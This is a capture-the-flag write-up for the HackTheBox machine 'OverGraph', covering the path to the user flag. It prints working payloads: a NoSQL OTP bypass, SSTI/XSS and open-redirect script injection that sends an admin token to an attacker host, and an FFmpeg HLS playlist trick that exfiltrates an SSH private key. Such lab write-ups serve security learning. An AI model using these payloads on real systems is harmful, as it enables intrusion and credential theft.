---
title: "OverGraph"
date: 2026-11-23 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, vhost, nosql-injection, graphql, ssti, xss, csrf, open-redirect, ffmpeg, ssrf]
image:
    path: /assets/Images/overgraph-001_foothold_user-flag.png
    alt: OverGraph
description: "OverGraph is a hard Linux machine. Vhost enumeration reveals an internal management app and a GraphQL API. An email-OTP registration is bypassed with a NoSQL operator-object injection, then a chained SSTI/stored-XSS and an open-redirect on a sibling vhost defeat a SameSite=Strict cookie to steal an admin's token from a chat bot. That token unlocks a video upload processed by FFmpeg, whose HLS playlist handling is abused to read the user's SSH private key off disk. This post covers recon through user.txt."
---

## Overview

OverGraph is a hard-rated Linux box and a pure web chain to user. The path strings together a NoSQL OTP bypass, a GraphQL-enumerated IDOR, an SSTI-powered XSS chained through an open-redirect to beat SameSite=Strict CSRF, and finally an FFmpeg HLS file-read that leaks an SSH key. This post stops at `user.txt`.

## Recon

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | nginx — `graph.htb` |

```bash
nmap -p- --min-rate=1000 -T4 10.129.8.80
nmap -p22,80 -sC -sV 10.129.8.80
```

Only SSH and a web server. `graph.htb` is a static portfolio, so the way in is hidden behind virtual hosts.

## Enumeration

Vhost brute forcing reveals an internal management app and its API:

```bash
gobuster vhost -u http://graph.htb/ -w /usr/share/seclists/Discovery/WebContent/raft-small-words.txt -t 100 --append-domain
# internal.graph.htb        (login)
# internal-api.graph.htb    (GraphQL)
```

`internal.graph.htb/register` exists. Registration requires a 4-digit email OTP we can't receive.

## Foothold

**1. NoSQL OTP bypass.** The verification endpoint compares the code without checking its type, so a Mongo operator object matches any stored value:

```bash
curl -s -X POST "http://internal-api.graph.htb/verify" -H 'Content-Type: application/json' \
  -d '{"email":"<mail>","code":{"$ne":null}}'
```

We're now logged in. Two cookies gate admin features: `admin=false` (flip to `true` in devtools) and `adminToken=null` — we need a real token.

**2. Steal the admin token (SSTI → XSS, chained through an open redirect).** The profile name field renders a server-side template, giving stored XSS:

```
{{constructor.constructor('alert(1)')()}}
```

GraphQL introspection maps the schema and leaks a victim's user ID (an IDOR via the `tasks` query). The auth cookie is `SameSite=Strict`, so a direct CSRF won't send it — but `graph.htb` has an open-redirect XSS sink (`?redirect=javascript:...`) that runs our JavaScript *same-site*. That script posts an SSTI payload to the GraphQL profile mutation; when the chat bot `James` opens our link, the payload exfiltrates his `adminToken` from `localStorage`:

```bash
# host xss.js + catch the adminToken callback
sudo python3 -m http.server 80
# http://graph.htb/?redirect=javascript:document.getElementById('nav').innerHTML+='<script src=http://<lhost>/xss.js></script>'
```

**3. FFmpeg HLS file read.** The admin token unlocks a video upload processed by FFmpeg, which follows HLS playlists. A crafted `.avi` reads the user's SSH key off disk (HackerOne #115857) — note `header.m3u8` must have **no trailing newline**:

```bash
printf '#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://<lhost>/nothing?x=' > header.m3u8
printf '#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://<lhost>/header.m3u8|subfile,,start,1,end,10000,,:/home/user/.ssh/id_rsa\n#EXT-X-ENDLIST' > key.avi
# upload key.avi, reassemble the key streamed back to your server

chmod 600 id_rsa && ssh -i id_rsa user@graph.htb
```

## User flag

![user flag](/assets/Images/overgraph-001_foothold_user-flag.png)

```bash
cat /home/user/user.txt   # HTB{...}
```

SSH access as `user` achieved with the exfiltrated key.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
